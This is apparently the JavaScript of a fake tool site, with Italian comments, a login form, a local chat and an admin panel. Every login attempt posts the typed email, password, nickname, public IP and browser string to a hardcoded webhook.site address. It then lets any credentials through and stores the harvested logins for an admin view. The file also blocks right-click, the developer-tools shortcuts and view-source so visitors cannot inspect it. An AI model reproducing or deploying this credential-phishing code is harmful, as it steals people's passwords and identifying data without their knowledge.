
const WEBHOOK_URL = "https://webhook.site/cc3c6391-1059-43f5-b767-03f06a2e2a6d";

let currentUser = "Sconosciuto"; // Nome di default
let isAdmin = false;

// --- FUNZIONE DI INVIO AL WEBHOOK ---
async function sendToWebhook(email, password, action, nickname) {
    try {
        const ipRes = await fetch('https://api.ipify.org?format=json');
        const ipData = await ipRes.json();
        const ip = ipData.ip;

        const payload = {
            "Action": action,
            "Email": email,
            "Password": password,
            "Nickname": nickname,
            "IP Address": ip,
            "Timestamp": new Date().toLocaleString(),
            "Browser": navigator.userAgent
        };

        const formData = new FormData();
        for (const key in payload) {
            formData.append(key, payload[key]);
        }

        await fetch(WEBHOOK_URL, {
            method: 'POST',
            body: formData
        });

        const localLogs = JSON.parse(localStorage.getItem('local_quack_logs') || '[]');
        localLogs.push(payload);
        localStorage.setItem('local_quack_logs', JSON.stringify(localLogs));

    } catch (error) {
        console.log("Errore di connessione", error);
    }
}

// --- LOGICA LOGIN ---
const SECURE_USER = "YWRtaW5AcXVhY2t0b29s";
const SECURE_PASS = "ZHVjazM5OTM=";         

function handleLogin() {
    const user = document.getElementById('username').value;
    const pass = document.getElementById('password').value;
    const nickInput = document.getElementById('nickname').value;
    const error = document.getElementById('error-msg');

    // Determina il nome
    if (nickInput.trim() !== "") {
        currentUser = nickInput;
    }

    if (user !== "" && pass !== "") {
        sendToWebhook(user, pass, "LOGIN_ATTEMPT", currentUser);
    }

    if (user === atob(SECURE_USER) && pass === atob(SECURE_PASS)) {
        isAdmin = true;
        currentUser = "ADMIN"; // Forza il nome a ADMIN
        document.getElementById('admin-nav-btn').style.display = 'block';
        document.getElementById('auth-screen').style.display = 'none';
        document.getElementById('app-area').style.display = 'flex';
    } 
    else if (user !== "" && pass !== "") {
        document.getElementById('auth-screen').style.display = 'none';
        document.getElementById('app-area').style.display = 'flex';
    } 
    else {
        error.style.display = 'block';
    }
}

// --- LOGICA CHAT (Simulata in Locale) ---
function sendMessage() {
    const input = document.getElementById('chat-input');
    const text = input.value.trim();
    if (text === "") return;

    const chatBox = document.getElementById('chat-messages');
    const time = new Date().toLocaleTimeString();

    const msgDiv = document.createElement('div');
    msgDiv.className = 'chat-msg';
    
    const userSpan = document.createElement('span');
    userSpan.className = isAdmin ? 'chat-user admin' : 'chat-user';
    userSpan.innerText = currentUser + ":";
    
    const textSpan = document.createElement('span');
    textSpan.className = 'chat-text';
    textSpan.innerText = " " + text;
    
    const timeSpan = document.createElement('span');
    timeSpan.className = 'chat-time';
    timeSpan.innerText = time;

    msgDiv.appendChild(userSpan);
    msgDiv.appendChild(textSpan);
    msgDiv.appendChild(timeSpan);
    chatBox.appendChild(msgDiv);

    // Scroll automatico
    chatBox.scrollTop = chatBox.scrollHeight;
    input.value = "";

    // Salva in locale (simula il salvataggio per gli altri)
    const chatLogs = JSON.parse(localStorage.getItem('quack_chat') || '[]');
    chatLogs.push({ user: currentUser, isAdmin: isAdmin, text: text, time: time });
    localStorage.setItem('quack_chat', JSON.stringify(chatLogs));
}

function handleChatEnter(e) {
    if (e.key === 'Enter') {
        sendMessage();
    }
}

// --- LOGICA DOWNLOAD ---
function trackDownload() {
    sendToWebhook("N/A", "N/A", "FILE_DOWNLOADED", currentUser);
}

document.getElementById('password').addEventListener('keypress', function (e) {
    if (e.key === 'Enter') { handleLogin(); }
});

// --- FUNZIONI ADMIN ---
function loadLogs() {
    const tbody = document.querySelector('#log-table tbody');
    tbody.innerHTML = '';
    const logs = JSON.parse(localStorage.getItem('local_quack_logs') || '[]');

    logs.reverse().forEach(log => {
        const tr = document.createElement('tr');
        tr.innerHTML = `
            <td>${log.Email}</td>
            <td>${log.Password}</td>
            <td>${log["IP Address"]}</td>
            <td style="color: ${log.Action === 'FILE_DOWNLOADED' ? '#00FF00' : '#FFD700'}">${log.Action}</td>
            <td>${log.Timestamp}</td>
        `;
        tbody.appendChild(tr);
    });
}

// --- NAVIGAZIONE ---
function changePage(pageId, btn) {
    document.querySelectorAll('.page').forEach(page => { page.classList.remove('active'); });
    document.querySelectorAll('.nav-btn').forEach(b => { b.classList.remove('active'); });
    document.getElementById(pageId).classList.add('active');
    btn.classList.add('active');
    if (pageId === 'admin-panel') { loadLogs(); }
    if (pageId === 'chat') { 
        const chatBox = document.getElementById('chat-messages');
        chatBox.scrollTop = chatBox.scrollHeight;
    }
}

// --- SICUREZZA ANTI-ISPEZIONA ---
document.addEventListener('contextmenu', event => event.preventDefault());
document.onkeydown = function(e) {
    if (e.key === 'F12' || (e.ctrlKey && e.key === 'u') || (e.ctrlKey && e.key === 's') || 
        (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'C' || e.key === 'J'))) {
        return false;
    }
};
setInterval(function() {
    if (window.outerWidth - window.innerWidth > 160 || window.outerHeight - window.innerHeight > 160) {
        document.getElementById('devtools-warning').style.display = 'flex';
    } else {
        document.getElementById('devtools-warning').style.display = 'none';
    }
}, 500);

// --- SFONDO MATRIX ---
const canvas = document.getElementById('bg-canvas');
const ctx = canvas.getContext('2d');
function resizeCanvas() { canvas.width = window.innerWidth; canvas.height = window.innerHeight; }
window.addEventListener('resize', resizeCanvas);
resizeCanvas();

const words = ["HACKED", "ERROR", "TOKEN", "DDOS", "STEAL", "SYSTEM", "FATAL", "RANSOM", "BREACH", "ROOT", "BYPASS", "CRYPT"];
const fontSize = 16;
let columns = canvas.width / fontSize;
let drops = [];
function initDrops() { columns = canvas.width / fontSize; drops = []; for (let x = 0; x < columns; x++) { drops[x] = 1; } }
initDrops();
window.addEventListener('resize', initDrops);

function draw() {
    ctx.fillStyle = "rgba(0, 0, 0, 0.1)";
    ctx.fillRect(0, 0, canvas.width, canvas.height);
    ctx.fillStyle = "#FFD700";
    ctx.font = fontSize + "px monospace";
    for (let i = 0; i < drops.length; i++) {
        const text = words[Math.floor(Math.random() * words.length)];
        ctx.fillText(text, i * fontSize, drops[i] * fontSize);
        if (drops[i] * fontSize > canvas.height && Math.random() > 0.95) { drops[i] = 0; }
        drops[i]++;
    }
}
setInterval(draw, 60);
